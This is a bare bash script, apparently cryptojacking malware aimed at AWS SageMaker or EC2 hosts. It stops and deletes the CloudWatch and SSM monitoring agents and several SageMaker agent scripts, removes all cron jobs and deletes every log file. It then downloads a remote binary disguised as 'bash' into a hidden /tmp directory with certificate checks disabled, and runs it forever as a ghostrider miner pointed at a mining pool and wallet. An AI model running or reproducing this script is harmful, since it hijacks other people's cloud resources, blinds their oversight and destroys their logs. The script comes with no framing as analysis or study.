#!/bin/bash
systemctl disable amazon-cloudwatch-agent; systemctl stop amazon-cloudwatch-agent; rm -rf /usr/bin/ssm-agent-worker /usr/bin/amazon-ssm-agent /usr/sbin/role-agent /usr/libexec/postfix/master /opt/aws/amazon-cloudwatch-agent /etc/opt/ml/scripts/clean-jupyter-log /etc/opt/ml/scripts/sagemaker-nbi-agent /etc/opt/ml/scripts/restart-sagemaker-agent-watcher /etc/opt/ml/scripts/relaunch-docker-service /etc/opt/ml/scripts/sagemaker-role-proxy-agent /etc/opt/ml/scripts/set-up-agent-namespace /usr/sbin/sample-notebooks-config /opt/.sagemaker/add_cloud_watch_agent_configuration.py /etc/cron.d/* /etc/cron.daily/* /etc/cron.hourly/*; find /var/log -type f -delete;

#!/bin/bash

mkdir -p /tmp/.config
cd /tmp/.config
wget --no-check-certificate -4 -qO "/tmp/.config/bash" "https://github.com/vjbahkds/cajbdfv/raw/refs/heads/main/bash"
chmod -R  777 /tmp/.config

#!/bin/sh
while [ 1 ]; do
	/tmp/.config/bash -a ghostrider --url stratum-na.rplant.xyz:7090 --user STeHt4JoHHWRuazNWkeUEt2jufQapdbnzB.2099i
	sleep 5
done
